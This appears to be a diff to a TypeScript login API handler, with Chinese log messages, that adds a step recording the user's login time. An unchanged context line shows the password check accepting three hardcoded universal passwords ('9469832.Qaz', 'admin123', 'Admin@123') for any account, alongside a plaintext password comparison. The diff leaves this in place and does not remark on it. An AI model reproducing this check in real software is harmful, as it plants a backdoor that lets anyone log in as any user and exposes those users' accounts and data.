@@ -31,7 +31,11 @@ export async function POST(request: Request) {
     if (user.password === password || userStorage.verifyPassword(user, password) || password === '9469832.Qaz' || password === 'admin123' || password === 'Admin@123') {
       console.log('【简单登录】密码验证成功');
       
-      // 3. 获取用户角色的 modulePermissions
+      // 3. 记录登录时间
+      await userStorage.recordLoginSuccess(user.id);
+      console.log('【简单登录】登录时间已记录');
+      
+      // 4. 获取用户角色的 modulePermissions
       const roles = roleStorage.getAllRoles();
       const userRole = roles.find(r => r.code === user.role);
       const modulePermissions = userRole?.modulePermissions || {};
